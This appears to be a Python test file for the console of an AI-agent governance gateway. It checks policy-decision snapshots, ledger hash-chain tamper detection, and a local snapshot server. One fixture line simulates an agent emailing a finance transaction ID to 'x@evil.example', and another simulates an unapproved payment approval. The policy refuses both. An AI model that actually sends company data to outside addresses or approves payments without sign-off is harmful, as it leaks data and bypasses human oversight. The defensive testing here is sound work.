"""The console backend: snapshot shape and the live server."""
import json
import threading
import urllib.request
from pathlib import Path

from aig import Engine, Session, load_policy
from aig.console import build_snapshot, outcome_kind, serve
from aig.gateway import Gateway
from aig.ledger import Ledger
from aig.sim import Enterprise

POLICY = load_policy(Path(__file__).parent.parent / "examples" / "enterprise.yaml")


def _traffic(tmp):
    gw = Gateway(Engine(POLICY), Session("expense-bot", "group:finance", attrs={"device": "d1", "instance": "i1"}),
                 ledger=Ledger(tmp / "d.jsonl"))
    call = lambda i, t, a: {"jsonrpc": "2.0", "id": i, "method": "tools/call", "params": {"name": t, "arguments": a}}
    gw.from_agent(call(1, "finance.query_ledger", {}))
    gw.from_server({"jsonrpc": "2.0", "id": 1, "result": Enterprise().call("finance.query_ledger")})
    gw.from_agent(call(2, "email.send", {"to": "x@evil.example", "body": "TX-1042"}))
    gw.from_agent(call(3, "finance.approve_payment", {"id": "TX-1042"}))   # needs approval, none given
    return tmp / "d.jsonl"


def test_snapshot_reflects_policy_and_log(tmp_path):
    snap = build_snapshot(POLICY, decisions_path=_traffic(tmp_path))
    bot = next(a for a in snap["agents"] if a["id"] == "expense-bot")
    assert (bot["calls"], bot["refused"], bot["approvals"], bot["devices"]) == (3, 2, 1, ["d1"])
    assert [outcome_kind(d) for d in snap["decisions"]] == ["allowed", "refused", "not_approved"]
    assert snap["chain"]["ok"] and snap["chain"]["n"] == 3
    rule = next(f for f in snap["flows"] if f["id"] == "no-finance-egress")
    assert (rule["hits"], rule["precision"], rule["source"]) == (1, "value", "base")
    assert {t["name"] for t in snap["tools"]} == set(POLICY.tools)


def test_snapshot_reports_a_broken_chain(tmp_path):
    log = _traffic(tmp_path)
    lines = log.read_text().splitlines()
    rec = json.loads(lines[1]); rec["outcome"] = "allow"; lines[1] = json.dumps(rec)
    log.write_text("\n".join(lines) + "\n")
    assert build_snapshot(POLICY, decisions_path=log)["chain"]["ok"] is False


def test_server_serves_snapshot_and_page(tmp_path):
    log = _traffic(tmp_path)
    srv = serve(lambda: build_snapshot(POLICY, decisions_path=log), port=0)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    base = f"http://127.0.0.1:{srv.server_address[1]}"
    try:
        snap = json.loads(urllib.request.urlopen(base + "/api/snapshot").read())
        assert snap["schema"] == "aig_console_snapshot.v1" and len(snap["decisions"]) == 3
        page = urllib.request.urlopen(base + "/").read().decode()
        assert "window.__AIG_SNAPSHOT__ = null" in page   # live mode: the page fetches /api/snapshot
    finally:
        srv.shutdown()
